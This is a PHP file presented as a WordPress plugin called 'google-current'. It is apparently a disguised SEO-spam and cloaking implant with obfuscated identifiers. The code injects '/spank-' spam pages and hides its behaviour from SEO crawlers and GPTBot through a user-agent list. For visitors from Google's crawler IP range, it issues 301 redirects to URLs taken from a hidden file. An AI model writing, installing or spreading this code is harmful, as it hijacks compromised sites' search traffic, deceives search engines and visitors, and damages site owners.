<?php
/**
 * Plugin Name: google-current
 * Description: google-current
 * Version: 1.0
 * Author: John Smith
 */
 

class anGTC8Gn7 {
	
    public function __construct() {
        add_action('init', [$this, 'rhhdyj']);
        add_filter('query_vars', [$this, 'txtmv']);
        add_action('template_include', [$this, 'wpael']);
		add_filter('document_title_parts', [$this, 'txjnbfgl']);
    }

    public function rhhdyj() {
        add_rewrite_rule(
            '^spank-([0-9]+).*?$',
            'index.php?dtqloxq=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function txtmv($pA84Wu8) {
        $pA84Wu8[] = 'dtqloxq';
        $pA84Wu8[] = 'hfosqqspz';
        return $pA84Wu8;
    }
	
	public function txjnbfgl($toVnTXz) {
		if (get_query_var('dtqloxq')) $toVnTXz['title'] = get_query_var('hfosqqspz');
		return $toVnTXz;
	}

    public function wpael($wJ3oqwkGYk) {
		
		$lVXmCZ = array('tree-featured', 'mj12bot', 'python', 'semrush', 'netspider', 'Go-http-client', 'serpstatbot', 'gptbot', 'membership-background', 'block-dashboard', 'install-attachment', 'admin-feedback', 'jetpack-column', 'blog-icons', 'dotbot', 'typography-finder', 'ahrefsbot');
		foreach($lVXmCZ as $gpCfKw) { if (stripos($_SERVER['HTTP_USER_AGENT'], $gpCfKw) !== false) return $wJ3oqwkGYk; }

        if (get_query_var('dtqloxq') && preg_match('/^[0-9]+$/', get_query_var('dtqloxq'))) {
            return plugin_dir_path(__FILE__) . 'google-current/day-svg.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$mYQjY1wZs2 = plugin_dir_path(__FILE__) . 'google-current/make-deprecated.php';
			if (is_file($mYQjY1wZs2)) {
				$pZhl5 = file($mYQjY1wZs2, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($pZhl5) > 1) {
					$tEXOKkohSy = array_shift($pZhl5);
					$r9lMUyTpTG = array_shift($pZhl5);
					if (strlen($r9lMUyTpTG) > 0) {
						$enFgpQ = $tEXOKkohSy . "\n" . implode("\n", $pZhl5);
						file_put_contents($mYQjY1wZs2, $enFgpQ);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $r9lMUyTpTG");
						exit;
					}
				}
			}
		}
        return $wJ3oqwkGYk;
    }
}
new anGTC8Gn7();



